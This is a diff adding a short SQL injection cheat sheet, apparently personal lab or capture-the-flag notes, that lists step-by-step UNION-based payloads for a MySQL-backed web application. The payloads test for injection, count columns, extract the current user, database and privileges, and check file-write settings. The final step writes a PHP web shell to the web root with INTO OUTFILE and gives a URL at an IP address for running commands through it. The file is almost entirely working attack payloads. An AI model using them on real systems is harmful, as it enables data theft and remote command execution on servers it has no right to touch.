@@ -1,0 +1,63 @@
+<sql_injection>
+    <testing_exist>
+        '
+        ' or 1=1 #
+
+    </testing_exist>
+            |
+            |
+            |
+            |
+            \/
+
+
+
+    <determine_row_num>
+        A%' ORDER BY 5#
+    </determine_row_num>
+
+            |
+            |
+            |
+            |
+            \/
+
+    <determine_output_row>
+        A%' UNION SELECT 1,2,3,4,5 #
+    </determine_output_row>
+            |
+            |
+            |
+            |
+            \/
+
+    <Gather_info>
+        <logined_user>
+            A%' UNION SELECT 1,user(),3,4,5 #
+        </logined_user>
+
+        <current_db>
+            cn' UNION select 1,database(),2,3-- -
+        </current_db>
+
+        <privilege>
+            A%' UNION SELECT 1,GRANTEE,PRIVILEGE_TYPE,IS_GRANTABLE,5 FROM INFORMATION_SCHEMA.USER_PRIVILEGES; #
+
+            <write>
+                A%' UNION SELECT 1,VARIABLE_NAME,VARIABLE_VALUE,4,5 FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME='SECURE_FILE_PRIV'#
+            </write>
+        </privilege>
+
+    </Gather_info>
+            |
+            |
+            |
+            |
+            \/
+
+
+    <write_to_file>
+        ' union select 1,'<?php     system($_REQUEST[0]); ?>',2,3 into outfile '/var/www/html/shell3.php'#
+        Then access it through "http://138.68.182.108:32362/shell3.php?0=ls"
+    </write_to_file>
+</sql_injection>
